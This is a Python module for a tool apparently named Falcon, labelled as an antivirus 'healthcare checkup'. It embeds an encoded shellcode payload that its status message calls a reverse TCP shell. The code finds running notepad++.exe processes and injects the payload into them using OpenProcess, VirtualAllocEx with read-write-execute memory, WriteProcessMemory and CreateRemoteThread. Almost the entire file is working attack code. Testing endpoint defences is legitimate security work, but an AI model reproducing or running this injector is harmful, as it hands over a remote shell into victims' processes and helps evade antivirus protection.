from ctypes import *
import wmi
from Falcon.core.falcon import pass_exec_result, check_dependency

# Falcon mandatory
Falcon_Module_Author= "Khalegh Salehi, khaleghsalehi@gmail.com"
Falcon_Module_Name = "shellcode injection for AV/Malware healthcare checkup"
Falcon_Module_Dependency_List = ["wmi"]


INJECTION_SUCCESS = "shellcode injection success"
INJECTION_FAILED = "shellcode injection failed"
SHELLCODE = b""
SHELLCODE += b"\xd9\xca\xd9\x74\x24\xf4\xbf\xe6\xd8\xaf\x0a\x58\x33\xc9\xb1\x60\x31\x78\x17\x83\xc0\x04\x03\x9e\xcb\x4d"
SHELLCODE += b"\xff\x87\x27\x48\x74\x13\x4c\x30\x5c\x92\x14\xd5\x0a\x4c\x51\x6b\x6b\x0f\x72\x77\xbd\x4c\x91\x8b\xfd\x54"
SHELLCODE += b"\xef\x16\x8f\x69\x2e\xe6\xb9\x6e\x35\xce\x78\x43\x54\xb9\x62\x51\xa3\xbf\x49\x57\xec\x75\xc5\x8d\x4e\x70"
SHELLCODE += b"\x0e\x1e\xb0\xeb\x37\xd9\x98\x15\x6e\xb4\x2a\x40\x2a\xd1\x9e\xfa\x3a\x30\x04\x32\x83\x5a\xf7\x99\xfb\xca"
SHELLCODE += b"\xb4\x37\xc7\xa0\xcb\x1c\x29\xe9\x17\x20\xa1\x9e\x74\xa9\x25\x7f\x80\xdc\xea\xf1\xd0\x25\x50\x83\x82\x11"
SHELLCODE += b"\x91\x67\x95\xba\xe3\x39\xb9\x8e\x13\x65\xc4\x88\xcb\x23\x37\x54\xdc\xcf\xc9\x10\x84\xde\x7a\x48\x5b\x8f"
SHELLCODE += b"\x17\xef\x6e\x2c\x9f\xcf\x57\x2e\x54\x12\xdc\x0d\xf0\x90\xaf\x1e\x3a\xa4\xf3\xe6\xd9\xbf\x07\x9f\x5d\x32"
SHELLCODE += b"\x7c\x54\x0b\xff\x3a\xe5\x64\x0d\x20\xf6\x20\x8a\xff\x84\x07\x8b\x99\x4d\x38\xdd\x3c\x50\x01\x4b\xcb\x31"
SHELLCODE += b"\x5c\x9d\x01\x44\x0e\x19\x7c\x30\xfe\x62\xdf\x67\x28\x69\xa7\x24\xd4\x9f\x6c\xd8\x35\x8a\x8f\x0d\xc3\xea"
SHELLCODE += b"\xcf\x61\x58\xd0\xdf\xb0\x7a\x90\x2e\x5c\x69\x91\xa7\x2c\xae\xf4\x17\xb3\xfb\xaf\xbb\x83\x6f\x2d\x88\x1b"
SHELLCODE += b"\xed\x22\xc3\x90\xcc\xeb\x54\xf3\x9b\xe3\xec\xd0\x04\x0d\x99\x47\x08\x97\xf8\xb8\xb9\xab\x0c\x9b\x8b\x93"
SHELLCODE += b"\x7a\xea\x51\x01\xfa\x79\xae\x7c\xc8\x7a\x20\x0e\xde\xde\x51\x10\xda\xe8\xb6\x01\xb4\x8e\x57\x2a\xfe\x17"
SHELLCODE += b"\x63\xa3\x1d\x86\x20\x64\xfe\x07\x32\xc7\xc6\x91\xba\x12\xb9\xb8\x21\x98\x43\x8b\xb5\x81\xa7\x24\x8e\x97"
SHELLCODE += b"\x19\xfc\xc9\xc9\xa4\xa5\x43\x64\xdc\x0e\x74\x57\x95\x2e\x16\x02\xaf\x23\xdc\x97\xca\x3b\xb2\xe0\x6e\x0c"
SHELLCODE += b"\xbc\x43\x99\x8b\xbb\x1d\xdb\x3d\x07\x84\x11\x9c\x95\x62\x7f\xe8\xfa\x1e\xbf\x48\x31\x05\xad\x86\xfb\x59"
SHELLCODE += b"\xd0\x09\xd8\xb4\xb3\x3e\xf5\x93\xde\xd0\xb5\xdf\x2c\x0d\x45\xbd\x6b"


def get_process_list():
    # Initializing the wmi constructor
    f = wmi.WMI()

    # Printing the header for the later columns
    print("pid   Process name")

    # Iterating through all the running processes
    for process in f.Win32_Process():
        # Displaying the P_ID and P_Name of the process
        # todo check if process is 32bit or download the case of 32bit for injection
        if 'notepad++.exe' in process.Name:  # notepad++ in my box
            print(f"{process.ProcessId:<10} {process.Name}")
            shell_injector(process.ProcessId)


def shell_injector(process_id):
    page_rwx_value = 0x40
    process_all = 0x1F0FFF
    memcommit = 0x00001000
    kernel32 = windll.kernel32
    shellcode_length = len(SHELLCODE)
    process_handle = kernel32.OpenProcess(process_all, False, process_id)
    memory_allocation_variable = kernel32.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit,
                                                         page_rwx_value)
    res = kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, SHELLCODE,
                                      shellcode_length, 0)
    kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)
    if res == 1:
        return INJECTION_SUCCESS
    else:
        return INJECTION_FAILED


if __name__ == "__main__":
    try:
        check_dependency(Falcon_Module_Dependency_List)
        pass_exec_result(Falcon_Module_Name, "reverse_tcp_shell injection done.")
        get_process_list()
        # todo find custom project, then inject the shellcode
    except:
        pass_exec_result(Falcon_Module_Name, "error while execution module")